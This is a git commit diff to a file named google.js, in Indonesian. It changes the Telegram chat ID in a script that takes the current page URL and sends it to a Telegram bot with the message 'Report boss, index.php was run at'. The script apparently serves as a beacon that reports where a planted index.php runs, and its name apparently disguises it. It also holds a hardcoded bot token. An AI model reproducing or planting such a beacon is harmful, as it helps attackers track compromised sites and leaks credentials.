9dce073c1f2cdf6b8305f7db0c03512734b1efd6
bengkelcat <bengkelcatx@gmail.com>
2025-07-29 16:09:53 +0700

    Update google.js

--- google.js
+++ google.js
@@ -2,7 +2,7 @@
   const url = window.location.href;
   const message = encodeURIComponent(`Lapor bos, index.php dijalankan di: ${url}`);
   const telegramToken = '8471738613:AAHY5IHGgp42sB8CoTJTC7iggOQiHRouqV4'; // Ganti dengan token kamu
-  const chatId = '-4967731078'; // Ganti dengan chat ID kamu
+  const chatId = '6813445148'; // Ganti dengan chat ID kamu
 
   fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${message}`)
     .then(response => console.log("Laporan dikirim ke Telegram"))
